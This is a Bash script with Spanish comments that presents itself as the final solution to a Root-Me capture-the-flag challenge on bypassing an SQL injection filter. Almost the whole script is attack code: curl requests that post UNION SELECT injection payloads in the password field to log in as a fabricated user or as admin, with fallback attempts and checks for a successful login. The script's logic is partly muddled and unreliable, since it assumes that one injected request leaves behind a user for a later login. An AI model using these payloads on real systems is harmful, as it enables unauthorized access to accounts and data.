#!/bin/bash

# ================================================
# SOLUCIÓN FINAL - SQL INJECTION FILTER BYPASS
# ================================================

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  SQL INJECTION FILTER BYPASS${NC}"
echo -e "${BLUE}  SOLUCIÓN FINAL${NC}"
echo -e "${BLUE}========================================${NC}"

# Datos del usuario virtual
USER="rootme"
PASS="rootme123"

echo -e "\n${YELLOW}[+] Creando usuario virtual con UNION SELECT...${NC}"

# Crear usuario virtual en la consulta SQL
curl -s -X POST "$URL" \
  -d "username=admin&password=' UNION SELECT 1,'$USER','$PASS',4 FROM membres WHERE 1=2#" > /dev/null

echo -e "\n${YELLOW}[+] Intentando autenticar con el usuario virtual...${NC}"

# Autenticar con el usuario virtual
login_response=$(curl -s -X POST "$URL" \
  -d "username=$USER&password=$PASS")

if echo "$login_response" | grep -q "Membres" && ! echo "$login_response" | grep -q "login failed"; then
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}  ¡DESAFÍO COMPLETADO!${NC}"
    echo -e "${GREEN}  Usuario: $USER${NC}"
    echo -e "${GREEN}  Contraseña: $PASS${NC}"
    echo -e "${GREEN}========================================${NC}"
    
    # Extraer el contenido de la página para ver si hay flag
    echo -e "\n${YELLOW}[+] Contenido de la página autenticada:${NC}"
    echo "$login_response" | grep -v "login failed" | grep -v "Authentification" | grep -v "iframe"
    
else
    echo -e "${RED}[✗] Falló la autenticación${NC}"
    
    # Probar con usuario "admin"
    echo -e "\n${YELLOW}[+] Probando con usuario admin...${NC}"
    curl -s -X POST "$URL" \
      -d "username=admin&password=' UNION SELECT 1,'admin','admin123',4 FROM membres WHERE 1=2#" > /dev/null
    
    login_response2=$(curl -s -X POST "$URL" \
      -d "username=admin&password=admin123")
    
    if echo "$login_response2" | grep -q "Membres" && ! echo "$login_response2" | grep -q "login failed"; then
        echo -e "${GREEN}========================================${NC}"
        echo -e "${GREEN}  ¡DESAFÍO COMPLETADO!${NC}"
        echo -e "${GREEN}  Usuario: admin${NC}"
        echo -e "${GREEN}  Contraseña: admin123${NC}"
        echo -e "${GREEN}========================================${NC}"
    else
        echo -e "${RED}[✗] Falló la autenticación con admin${NC}"
        
        # Último intento: Bypass con UNION SELECT directo
        echo -e "\n${YELLOW}[+] Último intento: Bypass directo con UNION SELECT...${NC}"
        final_response=$(curl -s -X POST "$URL" \
          -d "username=admin&password=' UNION SELECT 1,'admin','pass',4#" \
          | grep -E "Membres|login failed")
        
        echo "$final_response"
    fi
fi

echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}  FIN${NC}"
echo -e "${BLUE}========================================${NC}"
